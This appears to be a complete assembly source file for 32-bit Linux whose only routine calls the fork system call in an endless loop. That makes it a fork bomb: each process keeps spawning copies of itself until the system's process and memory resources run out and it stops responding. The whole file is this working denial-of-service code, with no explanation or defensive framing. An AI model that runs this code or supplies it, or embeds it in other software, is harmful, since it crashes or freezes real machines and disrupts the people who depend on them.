global _start

section .text

_start:
	push byte +0x2
	pop eax
	int 0x80
	jmp short _start
